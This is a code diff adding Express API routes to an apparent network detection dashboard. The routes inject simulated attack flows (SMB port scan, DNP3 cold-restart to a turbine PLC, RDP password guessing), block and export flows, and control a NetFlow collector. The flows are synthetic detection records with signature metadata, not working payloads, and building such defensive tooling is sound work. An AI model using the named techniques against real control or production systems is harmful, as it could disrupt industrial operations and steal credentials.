+          dstDeviceId: 'sw-core-01',
+          dstDeviceName: 'Core-Catalyst-9500',
+          protocol: 'TCP',
+          bytes: 38000,
+          packets: 620,
+          durationMs: 500,
+          flags: ['SYN'],
+          bps: 608000,
+          pps: 1240,
+          threatLevel: 'suspicious',
+          signatureMatch: {
+            signatureId: 'SIG-NET-SCAN-011',
+            signatureName: '高速內網橫向特權通訊埠探測與掃描',
+            mitreTTP: 'T1046 Network Service Discovery',
+            mitreTactic: 'Discovery',
+            mitreStage: 'Recon',
+            confidence: 94.2,
+            riskScore: 7.8,
+            description: '快速探測內網核心目標主機特權通訊埠 445 (SMB)，疑似自動化掃描載荷',
+            cve: 'MITRE-T1046'
+          },
+          sampledInterface: 'TenGigabitEthernet1/0/24',
+          status: 'active'
+        };
+        break;
+
+      case 'dnp3_exploit':
+        createdFlow = {
+          id: `flow-sim-dnp3-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.106',
+          srcPort: 51920,
+          srcDeviceId: 'ws-sec-7',
+          srcDeviceName: 'SOC-Analyst-WS07',
+          dstIp: '192.168.100.99',
+          dstPort: 20000,
+          dstDeviceId: 'plc-turb-01',
+          dstDeviceName: 'PLC-STATION-TURBINE-02',
+          protocol: 'DNP3',
+          bytes: 84200,
+          packets: 410,
+          durationMs: 3100,
+          flags: ['PSH', 'ACK'],
+          bps: 217000,
+          pps: 132,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-ICS-DNP3-015',
+            signatureName: '工控 DNP3 變電所協議非授權冷暖重開指令',
+            mitreTTP: 'T0814 Denial of Service for Control',
+            mitreTactic: 'Inhibit Response Function',
+            mitreStage: 'Lateral Movement',
+            confidence: 99.8,
+            riskScore: 9.9,
+            description: '電網 SCADA 遙測連線 (Port 20000) 捕獲 Function 0x0D Cold Restart 強制重啟指令',
+            cve: 'ICS-VU-DNP3-2026'
+          },
+          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
+          status: 'active'
+        };
+        const dnp3Dev = networkDevices.find(d => d.id === 'plc-turb-01');
+        if (dnp3Dev) { dnp3Dev.status = 'warning'; }
+        break;
+
+      case 'rdp_brute':
+        createdFlow = {
+          id: `flow-sim-rdp-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '198.51.100.44',
+          srcPort: 49210,
+          srcDeviceName: 'Ext-Host-Bot',
+          dstIp: '10.88.88.20',
+          dstPort: 3389,
+          dstDeviceId: 'srv-app-01',
+          dstDeviceName: 'SRV-APP-PROD-01',
+          protocol: 'TCP',
+          bytes: 940000,
+          packets: 4800,
+          durationMs: 42000,
+          flags: ['ACK', 'PSH'],
+          bps: 179000,
+          pps: 114,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-BRUTE-RDP-012',
+            signatureName: 'RDP / SMB 遠端桌面連線暴力密碼破解',
+            mitreTTP: 'T1110.001 Password Guessing',
+            mitreTactic: 'Credential Access',
+            mitreStage: 'Lateral Movement',
+            confidence: 98.1,
+            riskScore: 8.9,
+            description: 'RDP (Port 3389) 階段捕獲連續 NLA/CredSSP 憑證嘗試循環，超過警戒門檻',
+            cve: 'MITRE-T1110'
+          },
+          sampledInterface: 'Ethernet1/1 (WAN)',
+          status: 'active'
+        };
+        const rdpDev = networkDevices.find(d => d.id === 'srv-app-01');
+        if (rdpDev) { rdpDev.status = 'warning'; }
+        break;
+    }
+
+    networkFlows.unshift(createdFlow);
+
+    // Audit log
+    auditLogs.unshift({
+      id: `audit-${Date.now()}`,
+      timestamp: new Date().toISOString(),
+      deviceId: createdFlow.srcDeviceId || 'simulated',
+      deviceName: createdFlow.srcDeviceName || 'Simulated-Node',
+      ip: createdFlow.srcIp,
+      operator: 'SIMULATION-INJECTOR',
+      action: 'FLOW_ATTACK_SIMULATED',
+      details: `注入模擬攻擊 Flow [${createdFlow.signatureMatch?.signatureId}] ${createdFlow.signatureMatch?.signatureName}`,
+      status: 'CRITICAL'
+    } as any);
+
+    if (broadcastUpdate) {
+      broadcastUpdate({ type: 'flow_attack_simulated', flow: createdFlow });
+    }
+
+    res.json({
+      success: true,
+      message: `已成功注入 ${createdFlow.signatureMatch?.signatureName}，NetFlow 收集器與拓撲引擎已即時捕獲！`,
+      flow: createdFlow
+    });
+  });
+
+  // 12.5 POST /api/v1/network/flows/:id/block (1-Click Drop / Block Malicious Flow)
+  router.post('/flows/:id/block', (req: Request, res: Response) => {
+    const { id } = req.params;
+    const flow = networkFlows.find(f => f.id === id);
+    if (!flow) {
+      return res.status(404).json({ error: 'Flow record not found' });
+    }
+
+    flow.status = 'blocked';
+    flow.threatLevel = 'normal';
+
+    // Check if originating device has any other active malicious flows
+    const otherMalicious = networkFlows.some(f => (f.srcDeviceId === flow.srcDeviceId || f.srcIp === flow.srcIp) && f.status === 'active' && f.threatLevel === 'malicious');
+    if (!otherMalicious && flow.srcDeviceId) {
+      const dev = networkDevices.find(d => d.id === flow.srcDeviceId);
+      if (dev && dev.vlan !== 999) {
+        dev.status = 'online';
+      }
+    }
+
+    // Add to audit trail
+    auditLogs.unshift({
+      id: `audit-${Date.now()}`,
+      timestamp: new Date().toISOString(),
+      deviceId: flow.srcDeviceId || 'unknown',
+      deviceName: flow.srcDeviceName || flow.srcIp,
+      ip: flow.srcIp,
+      operator: 'SOC-NETWORK-ANALYST',
+      action: 'FLOW_DROPPED_BLOCKED',
+      details: `已在交換機/防火牆下發 ACL 阻斷流 [${flow.id}]: ${flow.srcIp}:${flow.srcPort} -> ${flow.dstIp}:${flow.dstPort} (${flow.signatureMatch?.signatureName || 'Threat Flow'})`,
+      status: 'RESOLVED'
+    } as any);
+
+    if (broadcastUpdate) {
+      broadcastUpdate({ type: 'flow_blocked', flowId: id });
+    }
+
+    res.json({
+      success: true,
+      message: `威脅 Flow ${id} 已由核心交換機/防火牆 ACL 即時阻斷丟棄！`,
+      flow
+    });
+  });
+
+  // 12.6 POST /api/v1/network/flows/clear-threats (Reset All Malicious Flows)
+  router.post('/flows/clear-threats', (req: Request, res: Response) => {
+    networkFlows.forEach(f => {
+      if (f.threatLevel === 'malicious') {
+        f.status = 'blocked';
+      }
+    });
+
+    networkDevices.forEach(d => {
+      if (d.vlan !== 999 && d.cpu < d.cpuThreshold) {
+        d.status = 'online';
+      }
+    });
+
+    res.json({
+      success: true,
+      message: '全網惡意 Flow 威脅已全數清除並恢復正常連線狀態',
+      activeMaliciousCount: 0
+    });
+  });
+
+  // 12.7 GET /api/v1/network/signatures (Full Attack Signatures Catalog)
+  router.get('/signatures', (_req: Request, res: Response) => {
+    const catalog = globalAttackSignatureEngine.getSignaturesCatalog();
+    res.json({
+      success: true,
+      totalCount: catalog.length,
+      signatures: catalog,
+      engineVersion: 'SEMOR Deep Signature Inspection Engine v5.0-ICS-NDR'
+    });
+  });
+
+  // 12.8 POST /api/v1/network/flows/parse-signature (Interactive Flow & Payload Signature Parser)
+  router.post('/flows/parse-signature', (req: Request, res: Response) => {
+    const { rawText, protocol, srcIp, dstIp, srcPort, dstPort, flags, bytes, pps } = req.body;
+    const textToAnalyze = rawText || `Flow [${protocol || 'TCP'}] ${srcIp || '10.88.88.105'}:${srcPort || 50000} -> ${dstIp || '192.168.100.88'}:${dstPort || 80}`;
+    
+    // Evaluate via AttackSignatureEngine
+    const customResult = globalAttackSignatureEngine.parseCustomLog(textToAnalyze, {
+      remoteIP: srcIp,
+      protocol,
+      dstPort: Number(dstPort || 0)
+    });
+
+    // Also evaluate via Flow Heuristics
+    const flowEvaluation = evaluateFlowThreat({
+      protocol: protocol || 'TCP',
+      srcIp: srcIp || '10.88.88.105',
+      dstIp: dstIp || '192.168.100.88',
+      srcPort: Number(srcPort || 50000),
+      dstPort: Number(dstPort || 80),
+      flags: Array.isArray(flags) ? flags : ['SYN', 'ACK'],
+      bytes: Number(bytes || 1024),
+      pps: Number(pps || 10)
+    });
+
+    const isSignatureHit = (customResult && customResult.signatureId !== 'SIG-HEURISTIC-GENERIC') || flowEvaluation.threatLevel !== 'normal';
+
+    res.json({
+      success: true,
+      matched: isSignatureHit,
+      detectionResult: customResult,
+      flowEvaluation,
+      analyzedInput: {
+        rawText: textToAnalyze,
+        protocol: protocol || 'TCP',
+        srcIp: srcIp || '10.88.88.105',
+        dstIp: dstIp || '192.168.100.88',
+        srcPort: Number(srcPort || 50000),
+        dstPort: Number(dstPort || 80)
+      },
+      timestamp: new Date().toISOString()
+    });
+  });
+
+  // 12.9 POST /api/v1/network/flows/batch-ingest (High-Throughput Batch Ingestion for Collector Core)
+  router.post('/flows/batch-ingest', (req: Request, res: Response) => {
+    const { flows: incomingFlows } = req.body;
+    if (!Array.isArray(incomingFlows) || incomingFlows.length === 0) {
+      return res.status(400).json({ error: 'flows must be a non-empty array' });
+    }
+
+    const processedFlows: NetworkFlowRecord[] = [];
+    let maliciousCount = 0;
+
+    for (const raw of incomingFlows) {
+      if (!raw.srcIp || !raw.dstIp) continue;
+      const { threatLevel, signatureMatch } = evaluateFlowThreat(raw);
+      if (threatLevel === 'malicious') maliciousCount++;
+
+      const flowRecord: NetworkFlowRecord = {
+        id: raw.id || `flow-batch-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+        timestamp: raw.timestamp || new Date().toISOString(),
+        srcIp: raw.srcIp,
+        srcPort: Number(raw.srcPort || 0),
+        srcDeviceId: raw.srcDeviceId,
+        srcDeviceName: raw.srcDeviceName || raw.srcDeviceId,
+        dstIp: raw.dstIp,
+        dstPort: Number(raw.dstPort || 0),
+        dstDeviceId: raw.dstDeviceId,
+        dstDeviceName: raw.dstDeviceName || raw.dstDeviceId,
+        protocol: raw.protocol || 'TCP',
+        bytes: Number(raw.bytes || 1024),
+        packets: Number(raw.packets || 10),
+        durationMs: Number(raw.durationMs || 1000),
+        flags: raw.flags || ['ACK'],
+        bps: Number(raw.bps || (raw.bytes ? raw.bytes * 8 : 8192)),
+        pps: Number(raw.pps || (raw.packets ? raw.packets : 10)),
+        threatLevel,
+        signatureMatch,
+        sampledInterface: raw.sampledInterface || 'VLAN 1 Management',
+        status: raw.status || 'active'
+      };
+
+      processedFlows.push(flowRecord);
+    }
+
+    // Prepend batch to in-memory flow ring buffer
+    networkFlows.unshift(...processedFlows);
+    if (networkFlows.length > 500) {
+      networkFlows.splice(500, networkFlows.length - 500);
+    }
+
+    if (broadcastUpdate && processedFlows.length > 0) {
+      broadcastUpdate({ type: 'flows_batch_ingested', count: processedFlows.length, maliciousCount });
+    }
+
+    res.json({
+      success: true,
+      ingestedCount: processedFlows.length,
+      maliciousCount,
+      totalActiveFlows: networkFlows.filter(f => f.status === 'active').length,
+      timestamp: new Date().toISOString()
+    });
+  });
+
+  // 12.10 GET /api/v1/network/flows/export (Export Flow Table as CSV for Wireshark & SIEM)
+  router.get('/flows/export', (req: Request, res: Response) => {
+    const { threatLevel, protocol, status } = req.query;
+    let exportList = [...networkFlows];
+
+    if (threatLevel && threatLevel !== 'all') {
+      exportList = exportList.filter(f => f.threatLevel === threatLevel);
+    }
+    if (protocol && protocol !== 'all') {
+      exportList = exportList.filter(f => f.protocol.toLowerCase() === String(protocol).toLowerCase());
+    }
+    if (status && status !== 'all') {
+      exportList = exportList.filter(f => f.status === status);
+    }
+
+    const headers = [
+      'Flow_ID', 'Timestamp', 'Source_IP', 'Source_Port', 'Source_Device',
+      'Destination_IP', 'Destination_Port', 'Destination_Device', 'Protocol',
+      'Bytes', 'Packets', 'Duration_ms', 'BPS', 'PPS', 'Threat_Level',
+      'Signature_ID', 'Signature_Name', 'Status', 'Sampled_Interface'
+    ];
+
+    const escapeCsv = (val: any) => `"${String(val ?? '').replace(/"/g, '""')}"`;
+    const rows = exportList.map(f => [
+      f.id,
+      f.timestamp,
+      f.srcIp,
+      f.srcPort,
+      f.srcDeviceName || '',
+      f.dstIp,
+      f.dstPort,
+      f.dstDeviceName || '',
+      f.protocol,
+      f.bytes,
+      f.packets,
+      f.durationMs,
+      f.bps,
+      f.pps,
+      f.threatLevel,
+      f.signatureMatch?.signatureId || '',
+      f.signatureMatch?.signatureName || '',
+      f.status,
+      f.sampledInterface
+    ].map(escapeCsv).join(','));
+
+    const csvContent = [headers.join(','), ...rows].join('\r\n');
+    const filename = `netflow_export_${Date.now()}.csv`;
+
+    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.send('\uFEFF' + csvContent);
+  });
+
+  // 12.11 Flow Collector Engine API (Status, Controls, Interfaces, Ingest)
+  // GET /api/v1/network/flows/collector/status (Collector Real-time Telemetry & Health)
+  router.get('/flows/collector/status', (_req: Request, res: Response) => {
+    res.json({
+      success: true,
+      metrics: globalFlowCollectorEngine.getMetrics(),
+      config: globalFlowCollectorEngine.getConfig(),
+      timestamp: new Date().toISOString()
+    });
+  });
+
+  // POST /api/v1/network/flows/collector/toggle (Start/Pause Live Flow Ingestion)
+  router.post('/flows/collector/toggle', (_req: Request, res: Response) => {
+    const isRunning = globalFlowCollectorEngine.toggle();
+    res.json({
+      success: true,
+      isRunning,
+      flowProbeActive: isRunning,
+      message: isRunning 
+        ? 'NetFlow/sFlow/IPFIX 即時收集引擎已啟動，開始持續取樣注入全網拓撲' 
+        : 'NetFlow/sFlow/IPFIX 即時收集引擎已暫停'
+    });
+  });
+
+  // Backward compatibility alias for probe-toggle
+  router.post('/flows/probe-toggle', (req: Request, res: Response) => {
+    const { active } = req.body;
+    let isRunning: boolean;
+    if (typeof active === 'boolean') {
+      if (active) {
+        globalFlowCollectorEngine.start();
+        isRunning = true;
+      } else {
+        globalFlowCollectorEngine.stop();
+        isRunning = false;
+      }
+    } else {
+      isRunning = globalFlowCollectorEngine.toggle();
+    }
+    res.json({
+      success: true,
+      flowProbeActive: isRunning,
+      isRunning,
+      message: isRunning ? 'NetFlow / IPFIX 探針串流已啟動' : 'NetFlow / IPFIX 探針串流已暫停'
+    });
+  });
+
+  // PUT /api/v1/network/flows/collector/config (Update Collector Parameters)
+  router.put('/flows/collector/config', (req: Request, res: Response) => {
+    const { samplingRatio, collectionIntervalMs, maxFlowsBuffer, autoDpiInspection, simulatedTrafficProfile } = req.body;
+    globalFlowCollectorEngine.updateConfig({
+      samplingRatio,
+      collectionIntervalMs: collectionIntervalMs ? Number(collectionIntervalMs) : undefined,
+      maxFlowsBuffer: maxFlowsBuffer ? Number(maxFlowsBuffer) : undefined,
+      autoDpiInspection,
+      simulatedTrafficProfile
+    });
+    res.json({
+      success: true,
+      message: 'NetFlow 收集引擎參數已成功更新並即時生效',
+      config: globalFlowCollectorEngine.getConfig()
+    });
+  });
+
+  // GET /api/v1/network/flows/collector/interfaces (Monitored Network Interfaces & Port Counters)
+  router.get('/flows/collector/interfaces', (_req: Request, res: Response) => {
+    res.json({
+      success: true,
+      interfaces: globalFlowCollectorEngine.getInterfaces(),
+      count: globalFlowCollectorEngine.getInterfaces().length,
+      timestamp: new Date().toISOString()
+    });
+  });
+
+  // POST /api/v1/network/flows/collector/flush (Flush In-Memory Flow Buffer)
+  router.post('/flows/collector/flush', (_req: Request, res: Response) => {
+    globalFlowCollectorEngine.flush();
+    res.json({
+      success: true,
+      message: 'NetFlow 收集器記憶體緩衝已重置為基準線初始狀態'
+    });
+  });
+
+  // POST /api/v1/network/flows/collector/inject-sample (Inject Custom Synthetic Flow)
+  router.post('/flows/collector/inject-sample', (req: Request, res: Response) => {
+    const newFlow = globalFlowCollectorEngine.ingestManualFlow(req.body);
+    res.json({
+      success: true,
+      message: '自訂測試 Flow 記錄已成功注入收集器佇列',
+      flow: newFlow
     });
   });
 
